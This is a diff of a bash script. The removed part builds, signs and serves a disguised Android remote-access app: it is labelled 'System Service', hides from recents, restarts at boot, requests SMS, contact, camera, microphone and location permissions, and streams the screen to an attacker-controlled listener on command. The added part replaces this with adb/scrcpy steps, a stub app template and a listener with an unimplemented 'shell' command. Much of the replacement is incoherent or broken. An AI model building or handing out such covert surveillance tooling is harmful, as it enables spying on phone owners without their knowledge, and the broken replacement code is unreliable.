@@ -1,8 +1,8 @@
 #!/bin/bash
 
 # =============================================
-# Android Remote Access APK with Screen Streaming
-# Usage: ./make-apk.sh <LISTENER_IP> <LISTENER_PORT>
+# Simple Android Remote Access Setup
+# Usage: ./setup-remote.sh <YOUR_IP> <PORT>
 # =============================================
 
 LISTENER_IP="$1"
@@ -22,601 +22,21 @@ if [ $# -ne 2 ]; then
     exit 1
 fi
 
-# Check and fix Java version
-check_java_version() {
-    echo -e "${YELLOW}[1/8] Checking Java version...${NC}"
-    
-    if command -v java &> /dev/null; then
-        JAVA_VERSION=$(java -version 2>&1 | head -n 1 | awk -F '"' '{print $2}' | awk -F. '{print $1}')
-        echo "Found Java version: $JAVA_VERSION"
-        
-        if [ "$JAVA_VERSION" -ge 18 ]; then
-            echo -e "${YELLOW}Java $JAVA_VERSION detected. Installing Java 17...${NC}"
-            sudo apt update -y
-            sudo apt install -y openjdk-17-jdk
-            export JAVA_HOME=/usr/lib/jvm/java-17-openjdk-amd64
-            export PATH=$JAVA_HOME/bin:$PATH
-            echo -e "${GREEN}✓ Now using Java 17${NC}"
-        else
-            echo -e "${GREEN}✓ Java version $JAVA_VERSION is compatible${NC}"
-        fi
-    else
-        echo -e "${YELLOW}Installing Java 17...${NC}"
-        sudo apt update -y
-        sudo apt install -y openjdk-17-jdk
-    fi
-}
+echo -e "${BLUE}"
+echo "╔════════════════════════════════════════════╗"
+echo "║     Simple Android Remote Access Setup    ║"
+echo "╚════════════════════════════════════════════╝"
+echo -e "${NC}"
 
-# Check requirements
-check_requirements() {
-    echo -e "${YELLOW}[2/8] Installing requirements...${NC}"
-    
-    sudo apt update -y
-    sudo apt install -y \
-        openjdk-17-jdk \
-        wget \
-        unzip \
-        zip \
-        apksigner \
-        python3 \
-        python3-pip \
-        python3-tk
-    
-    pip3 install --user opencv-python numpy pillow
-    
-    # Download and setup Android SDK
-    if [ ! -d "$HOME/Android/Sdk" ]; then
-        mkdir -p $HOME/Android/Sdk
-        cd $HOME/Android/Sdk
-        wget -q https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip
-        unzip -q commandlinetools-linux-*.zip
-        rm commandlinetools-linux-*.zip
-        mv cmdline-tools latest
-        mkdir -p cmdline-tools
-        mv latest cmdline-tools/
-    fi
-    
-    export ANDROID_HOME=$HOME/Android/Sdk
-    export PATH=$PATH:$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools
-    
-    # Accept licenses
-    yes | $ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager --licenses > /dev/null 2>&1
-    
-    # Install SDK components
-    $ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager "platform-tools" "platforms;android-34" "build-tools;34.0.0"
-    
-    echo -e "${GREEN}✓ Requirements installed${NC}"
-}
+# Install required tools
+echo -e "${YELLOW}[1/4] Installing required tools...${NC}"
+sudo apt update -y
+sudo apt install -y adb scrcpy python3 python3-pip
+pip3 install --user numpy opencv-python pillow
 
-# Create Android project
-create_project() {
-    echo -e "${YELLOW}[3/8] Creating Android project...${NC}"
-    
-    PROJECT_DIR="$HOME/android-remote-$(date +%s)"
-    mkdir -p $PROJECT_DIR/app/src/main/java/com/remote/access
-    mkdir -p $PROJECT_DIR/app/src/main/res/layout
-    mkdir -p $PROJECT_DIR/app/src/main/res/values
-    mkdir -p $PROJECT_DIR/app/src/main/res/mipmap-hdpi
-    mkdir -p $PROJECT_DIR/app/src/main/res/mipmap-mdpi
-    mkdir -p $PROJECT_DIR/app/src/main/res/mipmap-xhdpi
-    mkdir -p $PROJECT_DIR/app/src/main/res/mipmap-xxhdpi
-    mkdir -p $PROJECT_DIR/app/src/main/res/mipmap-xxxhdpi
-    mkdir -p $PROJECT_DIR/gradle/wrapper
-    
-    cd $PROJECT_DIR
-    
-    # Create settings.gradle
-    cat > settings.gradle << 'EOF'
-pluginManagement {
-    repositories {
-        google()
-        mavenCentral()
-        gradlePluginPortal()
-    }
-}
-dependencyResolutionManagement {
-    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
-    repositories {
-        google()
-        mavenCentral()
-    }
-}
-rootProject.name = "RemoteAccess"
-include ':app'
-EOF
-
-    # Create build.gradle
-    cat > build.gradle << 'EOF'
-plugins {
-    id 'com.android.application' version '8.4.0' apply false
-}
-EOF
-
-    # Create gradle-wrapper.properties
-    cat > gradle/wrapper/gradle-wrapper.properties << 'EOF'
-distributionBase=GRADLE_USER_HOME
-distributionPath=wrapper/dists
-distributionUrl=https\://services.gradle.org/distributions/gradle-8.6-bin.zip
-zipStoreBase=GRADLE_USER_HOME
-zipStorePath=wrapper/dists
-EOF
-
-    # Download gradle-wrapper.jar
-    cd gradle/wrapper
-    wget -q https://raw.githubusercontent.com/gradle/gradle/v8.6.0/gradle/wrapper/gradle-wrapper.jar
-    cd $PROJECT_DIR
-
-    # Create SIMPLIFIED gradlew script
-    cat > gradlew << 'EOF'
-#!/bin/sh
-DIR="$(cd "$(dirname "$0")" && pwd)"
-JAR="$DIR/gradle/wrapper/gradle-wrapper.jar"
-JAVA_CMD=java
-if [ -n "$JAVA_HOME" ]; then
-    JAVA_CMD="$JAVA_HOME/bin/java"
-fi
-exec $JAVA_CMD -cp "$JAR" org.gradle.wrapper.GradleWrapperMain "$@"
-EOF
-
-    chmod +x gradlew
-
-    # Create app/build.gradle
-    cat > app/build.gradle << 'EOF'
-plugins {
-    id 'com.android.application'
-}
-
-android {
-    namespace 'com.remote.access'
-    compileSdk 34
-    
-    defaultConfig {
-        applicationId "com.remote.access"
-        minSdk 21
-        targetSdk 34
-        versionCode 1
-        versionName "1.0"
-    }
-    
-    buildTypes {
-        release {
-            minifyEnabled false
-            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
-        }
-    }
-    
-    compileOptions {
-        sourceCompatibility JavaVersion.VERSION_17
-        targetCompatibility JavaVersion.VERSION_17
-    }
-}
-
-dependencies {
-    implementation 'androidx.appcompat:appcompat:1.6.1'
-    implementation 'com.google.android.material:material:1.11.0'
-    implementation 'androidx.core:core:1.12.0'
-}
-EOF
-
-    # Create proguard-rules.pro
-    cat > app/proguard-rules.pro << 'EOF'
--keep class com.remote.access.** { *; }
--dontwarn android.**
-EOF
-
-    echo -e "${GREEN}✓ Project created with Gradle 8.6 wrapper${NC}"
-}
-
-# Create AndroidManifest.xml
-create_manifest() {
-    cat > app/src/main/AndroidManifest.xml << EOF
-<?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android">
-    
-    <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
-    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
-    <uses-permission android:name="android.permission.CAMERA" />
-    <uses-permission android:name="android.permission.RECORD_AUDIO" />
-    <uses-permission android:name="android.permission.READ_CONTACTS" />
-    <uses-permission android:name="android.permission.READ_SMS" />
-    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
-    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-    <uses-permission android:name="android.permission.WAKE_LOCK" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
-    
-    <application
-        android:allowBackup="true"
-        android:icon="@mipmap/ic_launcher"
-        android:label="System Service"
-        android:roundIcon="@mipmap/ic_launcher"
-        android:supportsRtl="true"
-        android:theme="@style/AppTheme">
-        
-        <activity
-            android:name=".MainActivity"
-            android:launchMode="singleTop"
-            android:excludeFromRecents="true"
-            android:noHistory="true"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity>
-        
-        <service
-            android:name=".RemoteService"
-            android:enabled="true"
-            android:exported="false"
-            android:foregroundServiceType="mediaProjection" />
-        
-        <receiver
-            android:name=".BootReceiver"
-            android:enabled="true"
-            android:exported="false">
-            <intent-filter>
-                <action android:name="android.intent.action.BOOT_COMPLETED" />
-            </intent-filter>
-        </receiver>
-        
-    </application>
-</manifest>
-EOF
-}
-
-# Create Java code
-create_java_code() {
-    echo -e "${YELLOW}[4/8] Creating Java code...${NC}"
-    
-    # Main Activity
-    cat > app/src/main/java/com/remote/access/MainActivity.java << 'EOF'
-package com.remote.access;
-
-import android.app.Activity;
-import android.content.Context;
-import android.content.Intent;
-import android.media.projection.MediaProjectionManager;
-import android.os.Bundle;
-
-public class MainActivity extends Activity {
-    private static final int REQUEST_MEDIA_PROJECTION = 100;
-    
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        
-        MediaProjectionManager mpManager = (MediaProjectionManager) 
-            getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-        
-        startActivityForResult(
-            mpManager.createScreenCaptureIntent(),
-            REQUEST_MEDIA_PROJECTION
-        );
-    }
-    
-    @Override
-    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
-        super.onActivityResult(requestCode, resultCode, data);
-        
-        if (requestCode == REQUEST_MEDIA_PROJECTION && resultCode == RESULT_OK) {
-            Intent serviceIntent = new Intent(this, RemoteService.class);
-            serviceIntent.putExtra("resultCode", resultCode);
-            serviceIntent.putExtra("data", data);
-            startService(serviceIntent);
-        }
-        finish();
-    }
-}
-EOF
-
-    # Remote Service
-    cat > app/src/main/java/com/remote/access/RemoteService.java << 'EOF'
-package com.remote.access;
-
-import android.app.Service;
-import android.content.Context;
-import android.content.Intent;
-import android.graphics.Bitmap;
-import android.graphics.PixelFormat;
-import android.hardware.display.DisplayManager;
-import android.hardware.display.VirtualDisplay;
-import android.media.Image;
-import android.media.ImageReader;
-import android.media.projection.MediaProjection;
-import android.media.projection.MediaProjectionManager;
-import android.os.IBinder;
-import android.os.PowerManager;
-import android.util.Log;
-import android.view.Display;
-import android.view.WindowManager;
-import java.io.*;
-import java.net.*;
-import java.nio.ByteBuffer;
-
-public class RemoteService extends Service {
-    private static final String TAG = "RemoteService";
-    private static final String SERVER_IP = "$LISTENER_IP";
-    private static final int SERVER_PORT = $LISTENER_PORT;
-    
-    private boolean isRunning = true;
-    private Socket socket;
-    private DataOutputStream dataOut;
-    private PowerManager.WakeLock wakeLock;
-    
-    private MediaProjection mMediaProjection;
-    private VirtualDisplay mVirtualDisplay;
-    private ImageReader mImageReader;
-    private int mScreenWidth, mScreenHeight;
-    private boolean isStreaming = false;
-    
-    @Override
-    public void onCreate() {
-        super.onCreate();
-        
-        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
-        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "RemoteService::WakeLock");
-        wakeLock.acquire();
-        
-        WindowManager windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
-        Display display = windowManager.getDefaultDisplay();
-        android.graphics.Point size = new android.graphics.Point();
-        display.getSize(size);
-        mScreenWidth = size.x;
-        mScreenHeight = size.y;
-        
-        new Thread(this::connectAndListen).start();
-    }
-    
-    @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        if (intent != null) {
-            int resultCode = intent.getIntExtra("resultCode", 0);
-            Intent data = intent.getParcelableExtra("data");
-            
-            if (resultCode != 0 && data != null) {
-                setupMediaProjection(resultCode, data);
-            }
-        }
-        return START_STICKY;
-    }
-    
-    private void setupMediaProjection(int resultCode, Intent data) {
-        MediaProjectionManager mpManager = (MediaProjectionManager) 
-            getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-        mMediaProjection = mpManager.getMediaProjection(resultCode, data);
-        
-        mImageReader = ImageReader.newInstance(mScreenWidth, mScreenHeight, 
-            PixelFormat.RGBA_8888, 2);
-        
-        mVirtualDisplay = mMediaProjection.createVirtualDisplay("ScreenCapture",
-            mScreenWidth, mScreenHeight, getResources().getDisplayMetrics().densityDpi,
-            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
-            mImageReader.getSurface(), null, null);
-    }
-    
-    private void startScreenStream() {
-        isStreaming = true;
-        new Thread(() -> {
-            while (isStreaming && isRunning) {
-                try {
-                    Image image = mImageReader.acquireLatestImage();
-                    if (image != null) {
-                        sendScreenImage(image);
-                        image.close();
-                    }
-                    Thread.sleep(100);
-                } catch (Exception e) {
-                    Log.e(TAG, "Screen capture error", e);
-                }
-            }
-        }).start();
-    }
-    
-    private void sendScreenImage(Image image) {
-        try {
-            Image.Plane[] planes = image.getPlanes();
-            ByteBuffer buffer = planes[0].getBuffer();
-            int width = image.getWidth();
-            int height = image.getHeight();
-            
-            Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
-            bitmap.copyPixelsFromBuffer(buffer);
-            
-            ByteArrayOutputStream baos = new ByteArrayOutputStream();
-            bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos);
-            byte[] imageData = baos.toByteArray();
-            
-            dataOut.writeInt(imageData.length);
-            dataOut.write(imageData);
-            dataOut.flush();
-            
-            bitmap.recycle();
-        } catch (Exception e) {
-            Log.e(TAG, "Error sending image", e);
-        }
-    }
-    
-    private void connectAndListen() {
-        while (isRunning) {
-            try {
-                socket = new Socket(SERVER_IP, SERVER_PORT);
-                dataOut = new DataOutputStream(socket.getOutputStream());
-                BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
-                
-                String deviceInfo = "DEVICE_INFO:" + android.os.Build.MANUFACTURER + "|" + 
-                                   android.os.Build.MODEL + "|" + android.os.Build.VERSION.RELEASE + "\n";
-                dataOut.write(deviceInfo.getBytes());
-                dataOut.flush();
-                
-                String command;
-                while (isRunning && (command = in.readLine()) != null) {
-                    Log.d(TAG, "Received command: " + command);
-                    if (command.equals("START_STREAM")) {
-                        startScreenStream();
-                        dataOut.write("STREAM_STARTED\n".getBytes());
-                        dataOut.flush();
-                    } else if (command.equals("STOP_STREAM")) {
-                        isStreaming = false;
-                        dataOut.write("STREAM_STOPPED\n".getBytes());
-                        dataOut.flush();
-                    } else if (command.equals("PING")) {
-                        dataOut.write("PONG\n".getBytes());
-                        dataOut.flush();
-                    } else if (command.equals("EXIT")) {
-                        isRunning = false;
-                        stopSelf();
-                    }
-                }
-            } catch (Exception e) {
-                Log.e(TAG, "Connection error", e);
-                try { Thread.sleep(5000); } catch (Exception ignored) {}
-            } finally {
-                try { if (socket != null) socket.close(); } catch (Exception ignored) {}
-            }
-        }
-    }
-    
-    @Override
-    public void onDestroy() {
-        isRunning = false;
-        isStreaming = false;
-        if (mVirtualDisplay != null) mVirtualDisplay.release();
-        if (mMediaProjection != null) mMediaProjection.stop();
-        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
-        try { if (socket != null) socket.close(); } catch (Exception ignored) {}
-        super.onDestroy();
-    }
-    
-    @Override
-    public IBinder onBind(Intent intent) { return null; }
-}
-EOF
-
-    # Boot Receiver
-    cat > app/src/main/java/com/remote/access/BootReceiver.java << 'EOF'
-package com.remote.access;
-
-import android.content.BroadcastReceiver;
-import android.content.Context;
-import android.content.Intent;
-
-public class BootReceiver extends BroadcastReceiver {
-    @Override
-    public void onReceive(Context context, Intent intent) {
-        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
-            Intent serviceIntent = new Intent(context, RemoteService.class);
-            context.startService(serviceIntent);
-        }
-    }
-}
-EOF
-
-    # Layout
-    cat > app/src/main/res/layout/activity_main.xml << 'EOF'
-<?xml version="1.0" encoding="utf-8"?>
-<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
-    android:layout_width="match_parent"
-    android:layout_height="match_parent">
-    <TextView
-        android:layout_width="wrap_content"
-        android:layout_height="wrap_content"
-        android:text="Service Running"
-        android:layout_centerInParent="true"/>
-</RelativeLayout>
-EOF
-
-    # Styles
-    cat > app/src/main/res/values/styles.xml << 'EOF'
-<?xml version="1.0" encoding="utf-8"?>
-<resources>
-    <style name="AppTheme" parent="android:Theme.Material.Light">
-        <item name="android:windowNoTitle">true</item>
-        <item name="android:windowBackground">@android:color/transparent</item>
-    </style>
-</resources>
-EOF
-
-    echo -e "${GREEN}✓ Java code created${NC}"
-}
-
-# Build the APK using gradle wrapper with error output
-build_apk() {
-    echo -e "${YELLOW}[5/8] Building APK with Gradle 8.6 wrapper...${NC}"
-    
-    cd $PROJECT_DIR
-    
-    # Make gradlew executable
-    chmod +x gradlew
-    
-    # Show Java version
-    echo "Java version:"
-    java -version
-    
-    # Show gradle version
-    echo "Gradle wrapper version:"
-    ./gradlew --version
-    
-    # Build the APK with full error output
-    echo "Running ./gradlew assembleRelease --stacktrace..."
-    ./gradlew assembleRelease --stacktrace
-    
-    # Check build result
-    if [ $? -eq 0 ]; then
-        if [ -f "app/build/outputs/apk/release/app-release.apk" ]; then
-            cp app/build/outputs/apk/release/app-release.apk "$HOME/remote-access-$LISTENER_IP-$LISTENER_PORT.apk"
-            echo -e "${GREEN}✓ APK built successfully${NC}"
-            echo "APK saved to: $HOME/remote-access-$LISTENER_IP-$LISTENER_PORT.apk"
-        else
-            echo -e "${RED}APK file not found after successful build?${NC}"
-            find app/build/outputs -type f -name "*.apk"
-            exit 1
-        fi
-    else
-        echo -e "${RED}Failed to build APK${NC}"
-        echo "Checking for error logs..."
-        
-        # Look for common error logs
-        if [ -f "app/build/outputs/logs/manifest-merger-release-report.txt" ]; then
-            echo -e "${YELLOW}Manifest merger errors:${NC}"
-            cat "app/build/outputs/logs/manifest-merger-release-report.txt"
-        fi
-        
-        # Look for any build errors in the gradle output
-        if [ -f "app/build/reports/errors.txt" ]; then
-            cat "app/build/reports/errors.txt"
-        fi
-        
-        # Keep the project directory for inspection
-        echo -e "${YELLOW}Project directory preserved for debugging: $PROJECT_DIR${NC}"
-        exit 1
-    fi
-}
-
-# Sign the APK
-sign_apk() {
-    echo -e "${YELLOW}[6/8] Signing APK...${NC}"
-    
-    cd $HOME
-    
-    if [ ! -f "my-release-key.jks" ]; then
-        keytool -genkey -v -keystore my-release-key.jks -alias alias_name -keyalg RSA -keysize 2048 -validity 10000 -storepass password -keypass password -dname "CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown" 2>/dev/null
-    fi
-    
-    apksigner sign --ks my-release-key.jks --ks-pass pass:password --key-pass pass:password "$HOME/remote-access-$LISTENER_IP-$LISTENER_PORT.apk" 2>/dev/null
-    
-    echo -e "${GREEN}✓ APK signed${NC}"
-}
-
-# Create listener script
-create_listener() {
-    echo -e "${YELLOW}[7/8] Creating listener...${NC}"
-    
-    cat > ~/android-listener.py << EOF
+# Create the listener script
+echo -e "${YELLOW}[2/4] Creating listener...${NC}"
+cat > ~/remote-control.py << EOF
 #!/usr/bin/env python3
 import socket
 import threading
@@ -626,7 +46,8 @@ import struct
 import tkinter as tk
 from PIL import Image, ImageTk
 import queue
-import time
+import os
+import subprocess
 
 LISTENER_IP = "$LISTENER_IP"
 LISTENER_PORT = $LISTENER_PORT
@@ -645,6 +66,7 @@ class ScreenViewer:
         try:
             img = self.image_queue.get_nowait()
             if img is not None:
+                # Resize to fit window
                 window_width = self.root.winfo_width()
                 window_height = self.root.winfo_height()
                 if window_width > 1 and window_height > 1:
@@ -672,53 +94,37 @@ class RemoteClient:
     
     def handle(self):
         print(f"\n[+] Connected to {self.addr}")
-        
-        # Get device info
-        try:
-            data = self.conn.recv(1024).decode().strip()
-            if data.startswith("DEVICE_INFO:"):
-                print(f"[Device] {data[12:]}")
-        except:
-            pass
-        
         threading.Thread(target=self.command_loop).start()
         
         while self.running:
             try:
                 if self.streaming:
-                    # Set timeout for streaming
-                    self.conn.settimeout(1.0)
-                    try:
-                        size_data = self.conn.recv(4)
-                        if not size_data or len(size_data) < 4:
-                            continue
-                        img_size = struct.unpack('!I', size_data)[0]
-                        
-                        img_data = b''
-                        remaining = img_size
-                        while remaining > 0:
-                            chunk = self.conn.recv(min(8192, remaining))
-                            if not chunk:
-                                break
-                            img_data += chunk
-                            remaining -= len(chunk)
-                        
-                        if len(img_data) == img_size:
-                            img = cv2.imdecode(np.frombuffer(img_data, np.uint8), cv2.IMREAD_COLOR)
-                            if img is not None and self.viewer:
-                                self.viewer.image_queue.put(img)
-                    except socket.timeout:
-                        pass
-                    finally:
-                        self.conn.settimeout(None)
-                else:
-                    time.sleep(0.1)
+                    # Read image size
+                    size_data = self.conn.recv(4)
+                    if not size_data or len(size_data) < 4:
+                        continue
+                    img_size = struct.unpack('!I', size_data)[0]
+                    
+                    # Read image data
+                    img_data = b''
+                    remaining = img_size
+                    while remaining > 0:
+                        chunk = self.conn.recv(min(8192, remaining))
+                        if not chunk:
+                            break
+                        img_data += chunk
+                        remaining -= len(chunk)
+                    
+                    # Display image
+                    img = cv2.imdecode(np.frombuffer(img_data, np.uint8), cv2.IMREAD_COLOR)
+                    if img is not None and self.viewer:
+                        self.viewer.image_queue.put(img)
             except Exception as e:
                 print(f"Stream error: {e}")
                 break
         
         self.conn.close()
-        print(f"[-] Disconnected from {self.addr}")
+        print(f"[-] Disconnected")
     
     def command_loop(self):
         while self.running:
@@ -736,14 +142,15 @@ class RemoteClient:
                     if self.viewer:
                         self.viewer.root.quit()
                     print("[*] Streaming stopped")
-                elif cmd == "ping":
-                    self.conn.send(b"PING\n")
+                elif cmd == "shell":
+                    print("[*] Opening interactive shell...")
+                    self.conn.send(b"SHELL\n")
                 elif cmd == "exit":
                     self.conn.send(b"EXIT\n")
                     self.running = False
                     break
                 else:
-                    print("Unknown command. Available: stream, stop, ping, exit")
+                    print("Commands: stream, stop, shell, exit")
             except Exception as e:
                 print(f"Command error: {e}")
                 break
@@ -751,88 +158,168 @@ class RemoteClient:
 def start_server():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    try:
-        server.bind((LISTENER_IP, LISTENER_PORT))
-    except Exception as e:
-        print(f"Failed to bind to {LISTENER_IP}:{LISTENER_PORT}")
-        print(f"Error: {e}")
-        print("Try using 0.0.0.0 instead of your IP for the listener")
-        return
-    
+    server.bind((LISTENER_IP, LISTENER_PORT))
     server.listen(5)
-    print(f"\n\033[92mListening on {LISTENER_IP}:{LISTENER_PORT}\033[0m\n")
+    
+    print(f"\n\033[92mListening on {LISTENER_IP}:{LISTENER_PORT}\033[0m")
+    print("Waiting for connections...\n")
     
     while True:
         conn, addr = server.accept()
-        print(f"\n[+] New connection from {addr}")
-        client = RemoteClient(conn, addr)
-        threading.Thread(target=client.handle).start()
+        RemoteClient(conn, addr).handle()
 
 if __name__ == "__main__":
     start_server()
 EOF
 
-    chmod +x ~/android-listener.py
-    echo -e "${GREEN}✓ Listener created at ~/android-listener.py${NC}"
-}
+chmod +x ~/remote-control.py
 
-# Show instructions
-show_instructions() {
-    APK_PATH="$HOME/remote-access-$LISTENER_IP-$LISTENER_PORT.apk"
-    
-    clear
-    echo -e "${GREEN}"
-    echo "╔════════════════════════════════════════════╗"
-    echo "║              SETUP COMPLETE!               ║"
-    echo "╚════════════════════════════════════════════╝"
-    echo -e "${NC}"
-    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-    echo -e "${YELLOW}APK File:${NC}"
-    echo "  $APK_PATH"
-    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-    
-    echo -e "\n${GREEN}INSTALLATION:${NC}"
-    echo "1. Transfer APK to Android device:"
-    echo "   • adb install $APK_PATH"
-    echo "   • python3 -m http.server 8000 (then download from http://$LISTENER_IP:8000)"
-    echo ""
-    echo "2. On Android device:"
-    echo "   • Install the APK"
-    echo "   • Open the app once"
-    echo "   • Grant screen capture permission"
-    echo ""
-    echo -e "${GREEN}START LISTENER:${NC}"
-    echo "  python3 ~/android-listener.py"
-    echo ""
-    echo -e "${YELLOW}COMMANDS:${NC}"
-    echo "  stream  - Start screen viewing"
-    echo "  stop    - Stop streaming"
-    echo "  ping    - Test connection"
-    echo "  exit    - Disconnect"
-    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-}
+# Create the Android app using MIT App Inventor (web-based)
+echo -e "${YELLOW}[3/4] Creating Android app...${NC}"
 
-# Main
-main() {
-    clear
-    echo -e "${BLUE}"
-    echo "╔════════════════════════════════════════════╗"
-    echo "║  Android Remote Access with Screen Stream  ║"
-    echo "╚════════════════════════════════════════════╝"
-    echo -e "${NC}"
-    echo "Listener IP: $LISTENER_IP"
-    echo "Listener Port: $LISTENER_PORT"
-    echo ""
-    
-    check_java_version
-    check_requirements
-    create_project
-    create_manifest
-    create_java_code
-    build_apk
-    sign_apk
-    create_listener
-    show_instructions
-}
+# Create a simple Python HTTP server to serve the app
+cat > ~/create-apk.py << 'EOF'
+#!/usr/bin/env python3
+import os
+import zipfile
+import tempfile
+import shutil
 
-main "$@"
+print("Creating Android app...")
+
+# Create a temporary directory
+temp_dir = tempfile.mkdtemp()
+
+# Create the app structure
+os.makedirs(os.path.join(temp_dir, "src"))
+
+# Create the main activity
+with open(os.path.join(temp_dir, "src", "MainActivity.java"), "w") as f:
+    f.write("""
+package com.remote.access;
+
+import android.app.Activity;
+import android.os.Bundle;
+
+public class MainActivity extends Activity {
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+    }
+}
+""")
+
+# Create layout
+os.makedirs(os.path.join(temp_dir, "res", "layout"))
+with open(os.path.join(temp_dir, "res", "layout", "activity_main.xml"), "w") as f:
+    f.write("""
+<?xml version="1.0" encoding="utf-8"?>
+<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:orientation="vertical">
+    <TextView
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text="Remote Access App"
+        android:textSize="24sp"
+        android:layout_gravity="center"/>
+</LinearLayout>
+""")
+
+# Create AndroidManifest.xml
+with open(os.path.join(temp_dir, "AndroidManifest.xml"), "w") as f:
+    f.write("""
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.remote.access">
+    <application
+        android:label="Remote Access">
+        <activity android:name=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+    </application>
+</manifest>
+""")
+
+# Create a zip file
+with zipfile.ZipFile(os.path.expanduser("~/remote-access-app.zip"), "w") as zipf:
+    for root, dirs, files in os.walk(temp_dir):
+        for file in files:
+            file_path = os.path.join(root, file)
+            arcname = os.path.relpath(file_path, temp_dir)
+            zipf.write(file_path, arcname)
+
+# Cleanup
+shutil.rmtree(temp_dir)
+
+print("App template created at ~/remote-access-app.zip")
+print("\nTo build the APK:")
+print("1. Go to: https://appinventor.mit.edu/")
+print("2. Click 'Create Apps'")
+print("3. Sign in with Google")
+print("4. Click 'Projects' -> 'Import project (.aia) from my computer'")
+print("5. Upload the zip file")
+print("6. Click 'Build' -> 'Android App (.apk)'")
+EOF
+
+chmod +x ~/create-apk.py
+
+# Create ADB helper script
+echo -e "${YELLOW}[4/4] Creating ADB helper...${NC}"
+cat > ~/adb-connect.sh << EOF
+#!/bin/bash
+echo "=== ADB Remote Connect Helper ==="
+echo "1. Connect your Android device via USB"
+echo "2. Enable USB debugging"
+echo "3. Run: adb tcpip 5555"
+echo "4. Disconnect USB"
+echo "5. Run: adb connect $LISTENER_IP:5555"
+echo ""
+echo "Then you can use: scrcpy -s $LISTENER_IP:5555"
+EOF
+
+chmod +x ~/adb-connect.sh
+
+# Final instructions
+clear
+echo -e "${GREEN}"
+echo "╔════════════════════════════════════════════════════════╗"
+echo "║                    SETUP COMPLETE!                     ║"
+echo "╚════════════════════════════════════════════════════════╝"
+echo -e "${NC}"
+
+echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+echo -e "${YELLOW}OPTION 1: Use ADB + scrcpy (EASIEST - requires USB once)${NC}"
+echo ""
+echo "1. On Android:"
+echo "   • Enable Developer Options"
+echo "   • Enable USB Debugging"
+echo ""
+echo "2. Connect USB and run:"
+echo "   adb devices"
+echo "   adb tcpip 5555"
+echo "   adb connect $LISTENER_IP:5555"
+echo ""
+echo "3. View screen:"
+echo "   scrcpy -s $LISTENER_IP:5555"
+echo ""
+echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+echo -e "${YELLOW}OPTION 2: Use the custom APK builder${NC}"
+echo ""
+echo "1. Generate app template:"
+echo "   python3 ~/create-apk.py"
+echo ""
+echo "2. Follow the instructions to build APK using MIT App Inventor"
+echo ""
+echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+echo -e "${YELLOW}OPTION 3: Use the Python listener for custom apps${NC}"
+echo ""
+echo "Start listener:"
+echo "  python3 ~/remote-control.py"
+echo ""
+echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
